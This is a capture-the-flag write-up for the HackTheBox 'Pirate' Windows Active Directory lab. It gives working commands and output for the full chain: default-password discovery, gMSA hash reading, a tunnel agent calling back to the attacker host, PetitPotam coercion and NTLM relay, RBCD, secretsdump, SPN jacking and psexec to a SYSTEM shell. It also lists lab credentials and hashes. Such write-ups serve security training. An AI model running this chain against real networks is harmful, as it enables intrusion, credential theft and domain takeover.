# HackTheBox — Pirate (Hard)

![HTB](https://img.shields.io/badge/HackTheBox-Pirate-brightgreen?style=for-the-badge&logo=hackthebox)
![OS](https://img.shields.io/badge/OS-Windows%20Server%202019-blue?style=for-the-badge&logo=windows)
![Difficulty](https://img.shields.io/badge/Difficulty-Hard-red?style=for-the-badge)
![AD](https://img.shields.io/badge/Category-Active%20Directory-orange?style=for-the-badge)

> **Date:** March 4, 2026  
> **Author:** HTB  
> **OS:** Windows Server 2019 (Active Directory)

---

## Attack Chain Summary

```
Pre-Win2k Accounts → gMSA Password Read → Ligolo Pivot → PetitPotam Coercion
→ NTLM Relay to LDAP (--remove-mic) → RBCD → Secretsdump WEB01
→ a.white cleartext password → ForceChangePassword a.white_adm
→ SPN Jacking → Constrained Delegation w/ Protocol Transition → Domain Admin
```

---

## Network Topology

```
KALI (10.10.14.223)
  │
  │ VPN
  │
DC01 (10.129.244.95 / 192.168.100.1)  ◄────►  WEB01 (192.168.100.2)
  │  Dual-homed                                 SMB Signing: OFF
  │
  └─ WEB01 can reach Kali directly via 10.10.14.223 ← critical for relay
```

---

## 1. Enumeration

### Port Scan

```bash
nmap -sC -sV -p- 10.129.244.95
```

Key services on DC01:

| Port | Service | Note |
|------|---------|------|
| 53 | DNS | |
| 88 | Kerberos | |
| 389/636 | LDAP/LDAPS | Signing NOT enforced |
| 445 | SMB | Signing required on DC01, OFF on WEB01 |
| 5985 | WinRM | |

**Initial credentials provided:** `pentest:[REDACTED]`

---

## 2. Pre-Windows 2000 Machine Accounts

Using NetExec's `pre2k` module to discover computer accounts with default passwords:

```bash
nxc smb 10.129.244.95 -u pentest -p '[PASSWORD]' -M pre2k
```

| Account | Default Password |
|---------|-----------------|
| MS01$ | ms01 |
| ES01$ | es01 |

---

## 3. gMSA Password Retrieval

`MS01$` has `msDS-AllowedToRetrieveManagedPassword` — it can read gMSA passwords.

```bash
# Get TGT for MS01$
getTGT.py 'pirate.htb/MS01$:ms01' -dc-ip 10.129.244.95
export KRB5CCNAME=MS01\$.ccache

# Read gMSA hashes
nxc ldap 10.129.244.95 -u 'MS01$' -p 'ms01' --gmsa
```

| gMSA Account | NT Hash |
|-------------|---------|
| gMSA_ADFS_prod$ | `[REDACTED]` |
| gMSA_ADCS_prod$ | `[REDACTED]` |

Logging into DC01 with `gMSA_ADFS_prod$` via evil-winrm reveals a second NIC on `192.168.100.1/24`.

---

## 4. Pivoting with Ligolo-ng

### Kali (proxy)

```bash
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 192.168.100.0/24 dev ligolo
./proxy -selfcert -laddr 0.0.0.0:11601
```

### DC01 (agent, via evil-winrm)

```bash
evil-winrm -i 10.129.244.95 -u 'gMSA_ADFS_prod$' -H '[GMSA_HASH]'
```

```powershell
.\agent.exe -connect 10.10.14.223:11601 -ignore-cert
```

### Ligolo console

```
session
start
listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445
```

### Internal Network Discovery

```bash
nmap -sV -p 445,80,5985 192.168.100.2
```

**WEB01 (192.168.100.2):** Windows Server 2019 Core, SMB signing **disabled** — relay target confirmed. WEB01 can reach Kali's VPN IP directly, no need to relay through DC01.

---

## 5. NTLM Relay: PetitPotam → LDAP

### Why it works

- WEB01 has SMB signing disabled → can be coerced
- WEB01 can reach Kali directly → clean relay path
- LDAP signing not enforced on DC01 → relay accepted
- `--remove-mic` bypasses MIC check required for cross-protocol SMB→LDAP relay on Server 2019

> ⚠️ Use `ldap://` NOT `ldaps://` — LDAPS channel binding blocks relay on Server 2019

### Step 1 — Free port 445

```bash
sudo systemctl stop smbd nmbd
```

### Step 2 — Start ntlmrelayx with --delegate-access

```bash
sudo python3 ntlmrelayx.py \
  -t ldap://10.129.244.95 \
  --remove-mic \
  --no-wcf-server \
  -smb2support \
  --delegate-access
```

> Using `--delegate-access` instead of `-i` (interactive shell) automatically configures RBCD without a timing race condition.

### Step 3 — Coerce WEB01

```bash
python3 PetitPotam.py \
  -u 'gMSA_ADFS_prod$' \
  -hashes ':[GMSA_HASH]' \
  -d pirate.htb \
  10.10.14.223 192.168.100.2
```

### Result

```
[*] Authenticating connection from PIRATE/WEB01$@10.129.244.95 against ldap://10.129.244.95 SUCCEED
[*] Adding new computer with username: FGBLFJLX$ and password: p<K/A6Ke@e{20aq
[*] Delegation rights modified successfully!
[*] FGBLFJLX$ can now impersonate users on WEB01$ via S4U2Proxy
```

---

## 6. S4U2Proxy → Administrator on WEB01

```bash
sudo ntpdate -u 10.129.244.95

python3 getST.py \
  -spn cifs/WEB01.pirate.htb \
  -impersonate Administrator \
  -dc-ip 10.129.244.95 \
  'pirate.htb/FGBLFJLX$:p<K/A6Ke@e{20aq'

export KRB5CCNAME=Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache
```

---

## 7. Secretsdump WEB01

```bash
python3 secretsdump.py \
  -k -no-pass \
  -target-ip 192.168.100.2 \
  WEB01.pirate.htb
```

Key findings from LSA Secrets:

| Secret | Value |
|--------|-------|
| `DefaultPassword` (a.white) | `E2nvAOKSz5Xz2MJu` ← cleartext |
| WEB01$ NT Hash | `[REDACTED]` |
| Local Admin NT Hash | `[REDACTED]` |

> The cleartext password was stored in `DefaultPassword` under LSA Secrets — typical of systems configured for automatic logon.

---

## 8. ForceChangePassword: a.white → a.white_adm

BloodHound shows `a.white` has `ForceChangePassword` rights over `a.white_adm`.

```bash
net rpc password 'a.white_adm' 'Password123!' \
  -U 'pirate.htb/a.white%E2nvAOKSz5Xz2MJu' \
  -S 10.129.244.95
```

Verify:

```bash
nxc smb 10.129.244.95 -u 'a.white_adm' -p 'Password123!' -d pirate.htb
# [+] pirate.htb\a.white_adm:Password123!
```

---

## 9. Constrained Delegation + SPN Jacking → Domain Admin

### Delegation Discovery

```bash
python3 findDelegation.py 'pirate.htb/a.white_adm:Password123!' -dc-ip 10.129.244.95
```

```
a.white_adm  Person  Constrained w/ Protocol Transition  HTTP/WEB01.pirate.htb
```

`a.white_adm` also has `WriteSPN` on `DC01$`.

### SPN Jacking

Move `HTTP/WEB01.pirate.htb` from `WEB01$` → `DC01$` so the KDC thinks this SPN lives on DC01:

```python
import ldap3

server = ldap3.Server('10.129.244.95', get_info=ldap3.ALL)
conn = ldap3.Connection(server, user='pirate.htb\\a.white_adm',
                        password='Password123!', authentication=ldap3.NTLM, auto_bind=True)

# Remove SPN from WEB01$
conn.modify('CN=WEB01,CN=Computers,DC=pirate,DC=htb',
    {'servicePrincipalName': [(ldap3.MODIFY_DELETE, ['HTTP/WEB01.pirate.htb'])]})

# Add SPN to DC01$
conn.modify('CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb',
    {'servicePrincipalName': [(ldap3.MODIFY_ADD, ['HTTP/WEB01.pirate.htb'])]})
```

### KCD with altservice

Request a ticket for `HTTP/WEB01.pirate.htb` via constrained delegation, then rewrite to `CIFS/DC01.pirate.htb`. The ticket is encrypted with DC01's key — DC01 accepts it as valid.

```bash
python3 getST.py \
  -spn HTTP/WEB01.pirate.htb \
  -impersonate Administrator \
  -altservice CIFS/DC01.pirate.htb \
  -dc-ip 10.129.244.95 \
  'pirate.htb/a.white_adm:Password123!'
```

```
[*] Changing service from HTTP/WEB01.pirate.htb@PIRATE.HTB to CIFS/DC01.pirate.htb@PIRATE.HTB
[*] Saving ticket in Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache
```

---

## 10. SYSTEM Shell on DC01

```bash
export KRB5CCNAME=Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache

python3 psexec.py -k -no-pass \
  -dc-ip 10.129.244.95 \
  -target-ip 10.129.244.95 \
  pirate.htb/Administrator@DC01.pirate.htb
```

```
Microsoft Windows [Version 10.0.17763.8385]
C:\Windows\system32> whoami
nt authority\system
```

---

## Flags

| Flag | Location |
|------|----------|
| User | `\\192.168.100.2\c$\Users\a.white\Desktop\user.txt` |
| Root | `C:\Users\Administrator\Desktop\root.txt` |

---

## Credentials Collected

| Account | Type | Value |
|---------|------|-------|
| pentest | Password | `[REDACTED]` |
| MS01$ | Password | `ms01` |
| ES01$ | Password | `es01` |
| gMSA_ADFS_prod$ | NT Hash | `fd9ea7ac7820dba5155bd6ed2d850c09` |
| gMSA_ADCS_prod$ | NT Hash | `[REDACTED]` |
| FGBLFJLX$ (relay) | Password | `p<K/A6Ke@e{20aq` |
| a.white | Password | `E2nvAOKSz5Xz2MJu` |
| a.white_adm | Password | `Password123!` (changed) |
| WEB01 Local Admin | NT Hash | `b1aac1584c2ea8ed0a9429684e4fc3e5` |

---

## Key Takeaways

1. **Network connectivity testing is crucial** — WEB01 could reach Kali directly, making the relay trivial. Always verify bidirectional connectivity before setting up complex relay chains.

2. **`ldap://` not `ldaps://` for relay** — LDAPS channel binding blocks NTLM relay on Server 2019. Use plain LDAP with `--remove-mic` to bypass MIC verification.

3. **`--delegate-access` over interactive shell** — Avoids the timing race condition of connecting to an ephemeral LDAP shell. ntlmrelayx handles RBCD configuration automatically.

4. **DefaultPassword in LSA Secrets** — Auto-logon systems store credentials in cleartext. Always read LSA Secrets carefully in secretsdump output.

5. **SPN Jacking** — `WriteSPN` on a target lets you redirect any constrained delegation chain to that target by moving the SPN. Combined with `-altservice` in getST.py, this converts any service ticket type into CIFS access for psexec.

---

*Writeup by [your handle] | HackTheBox — Pirate (Hard)*
